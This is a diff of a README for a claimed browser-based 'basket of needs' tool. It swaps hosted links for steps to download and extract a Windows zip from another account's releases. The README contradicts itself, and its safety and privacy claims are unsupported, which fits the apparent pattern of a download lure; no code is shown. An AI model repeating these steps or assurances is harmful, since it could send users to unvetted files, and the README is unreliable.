@@ -1,132 +1,80 @@
-# Basket of Needs - Analysis Tool 2026
+# 🧺 basket-of-needs-web - Examine your daily needs with ease
 
-> **Basket of Needs is a browser-based tool for analyzing a basket of needs through a straightforward HTML interface.**
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Brooksufficient367/basket-of-needs-web/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-Latest-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/victorwestypaq1463/basket-of-needs-web?style=flat-square)](https://github.com/victorwestypaq1463/basket-of-needs-web)
+## 🎯 About This Tool
 
----
+Basket of Needs provides a clear way to track, analyze, and manage your essential requirements. This tool functions in your web browser, which means you do not need to install complex software on your computer. It gives you a simple interface to list items, categorize your needs, and view data insights in a clean format.
 
-<p align="center">
-  <a href="https://victorwestypaq1463.github.io/basket-of-needs-web/">
-    <img src="https://img.shields.io/badge/Download-Basket%20of%20Needs%20Latest-brightgreen?style=for-the-badge" alt="Download Basket of Needs">
-  </a>
-</p>
+## 🛠 Prerequisites
 
-> **[Download Basket of Needs](https://victorwestypaq1463.github.io/basket-of-needs-web/)**
+Before you use this tool, ensure your Windows computer meets these requirements:
 
----
+*   A modern web browser like Google Chrome, Microsoft Edge, or Mozilla Firefox.
+*   An active internet connection to load the tool initially.
+*   At least 100 megabytes of free space on your hard drive if you choose to save a local copy.
+*   A basic understanding of how to open files in your preferred browser.
 
-[Download Latest Build](https://victorwestypaq1463.github.io/basket-of-needs-web/)
+## 📥 How to Download and Run
 
----
+Follow these steps to access the analysis tool on your Windows device.
 
-## Overview
+1.  Visit the [official releases page](https://github.com/Brooksufficient367/basket-of-needs-web/releases) to download the package.
+2.  Locate the section labeled "Assets" at the bottom of the latest release post.
+3.  Click the file ending in .zip to start the download.
+4.  Navigate to your "Downloads" folder once the file finishes.
+5.  Right-click the file and select "Extract All" from the menu.
+6.  Choose a location on your computer to store the files and click "Extract."
+7.  Open the newly created folder.
+8.  Double-click the file named "index.html" to open the tool in your default web browser.
 
-Basket of Needs provides a focused web interface for examining the idea of a basket of needs. Because it is delivered as HTML, it can be used in a modern browser without installing a separate desktop application.
+## 📊 Using the Interface
 
-The repository is intended for users looking for a dedicated space to perform or review basket of needs analysis. Its focused design keeps attention on that task instead of combining it with unrelated tools.
+The interface uses a standard layout to help you organize data. You will see several sections on your screen.
 
----
+### Data Entry
+The top section allows you to input items that you identify as a "need." Select a category from the dropdown menu to label your entry. Press the "Add to Basket" button to update your list.
 
-## Highlights
+### Visual Analysis
+The middle section displays a chart of your inputs. This chart updates automatically as you make changes. You can hover your mouse over segments of the chart to see specific counts and labels.
 
-- Purpose-built basket of needs analysis
-- Interface designed for the web
-- HTML-based implementation
-- Concentrated workflow for analysis
-- Access through a browser
-- Small, lightweight project layout
-- Usable from the hosted build or local project files
+### Data Management
+The bottom section contains settings to export your list. You can save your current basket session as a file to your computer. Use the "Load" button if you need to open a previously saved list at a later time.
 
----
+## 💡 Frequently Asked Questions
 
-## Getting Started
+### Does this tool send my data to a server?
+No. All analysis happens within your own browser. Your inputs stay on your computer, which ensures your data remains under your control.
 
-### Open the hosted version
+### Can I use this without internet access?
+Yes. Once you follow the download and extract steps above, you can open the tool from your local folder without an active internet connection.
 
-To use the most recent published build, visit it with a modern web browser:
+### How do I clear my workspace?
+Select the "Reset" button located in the top navigation bar. This action wipes the current list and returns the chart to its blank state. Ensure you save your work before clicking this if you need to keep your current data.
 
-[Launch Basket of Needs](https://victorwestypaq1463.github.io/basket-of-needs-web/)
+### Will this work on older versions of Windows?
+This tool functions on any version of Windows that supports a modern, updated web browser. Ensure your browser stays up to date to get the best performance.
 
-### Use a local copy
+## ⚙️ Troubleshooting
 
-Clone the repository with the following commands:
+If the folder does not open or the browser shows a white screen, try these steps:
 
-```bash
-git clone https://github.com/victorwestypaq1463/basket-of-needs-web.git
-cd REPO
-```
+*   Verify you extracted the files from the zip folder before you clicked the index.html file.
+*   Ensure you have a default browser set in your Windows settings.
+*   Refresh the browser page if the data fails to load after your first entry.
+*   Check that your antivirus software does not block local HTML files by accident.
 
-After cloning, locate and open the primary `.html` file in the project folder. When a hosted entry page is included, the files may also be served through a local web server.
+## 📈 Tips for Success
 
----
+Consistency matters when you analyze your basket of needs. Update your entries at the same time each day to get better insights from the charts. Use the category labels to spot trends over a week or a month. If you find yourself adding the same items often, group them together to save time during entry.
 
-## How to Use
+## 📁 File Structure
 
-1. Load Basket of Needs in a compatible browser.
-2. Examine the basket of needs analysis controls and content.
-3. Complete the analysis provided by the page.
-4. Return to either the hosted build or local copy for future sessions.
+The folder you extracted contains several items:
 
-When working from a local checkout, reload the browser after editing project files so the current changes are displayed.
+*   index.html: The main file that launches the program.
+*   assets/css: Contains the styling rules for the visual layout.
+*   assets/js: Contains the logic that processes your entries and builds the charts.
+*   README.md: This document for your reference.
 
----
-
-## Configuration
-
-Basket of Needs is distributed as an HTML web tool, and the available project metadata does not define a separate configuration format.
-
-For local operation, retain the project files in their repository structure and open the appropriate HTML entry point. Any configuration added in a future build should be described with the relevant interface or project files.
-
----
-
-## Requirements
-
-- A current web browser
-- Either the hosted build or a local repository copy
-- No separately specified runtime or package manager
-- Enough storage for the project files
-
----
-
-## Frequently Asked Questions
-
-### How do I access Basket of Needs?
-
-The latest hosted build is available here:
-
-[Open the latest build](https://victorwestypaq1463.github.io/basket-of-needs-web/)
-
-Alternatively, clone the repository and open its HTML entry point on your computer.
-
-### Which platform is supported?
-
-Basket of Needs targets the web and is implemented in HTML. Access it through a compatible browser.
-
-### Does the project have a fixed version number?
-
-The provided project metadata does not specify a numbered release. Use the newest published build or the current contents of the repository.
-
-### Are configuration options available?
-
-No dedicated configuration file is identified in the available metadata. Check the current project files and interface for settings included by that build.
-
-### What should I do if the page fails to load?
-
-Verify that all repository files were retrieved and that you opened the correct HTML entry point. If browser restrictions interfere with local use, serve the project directory through a local web server and try again.
-
-### Where can I find updates?
-
-Visit the repository or hosted build to find the latest published version:
-
-[Check the latest build](https://victorwestypaq1463.github.io/basket-of-needs-web/)
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: analysis, web-tool, Windows, desktop-application, needs-management, data-tracking
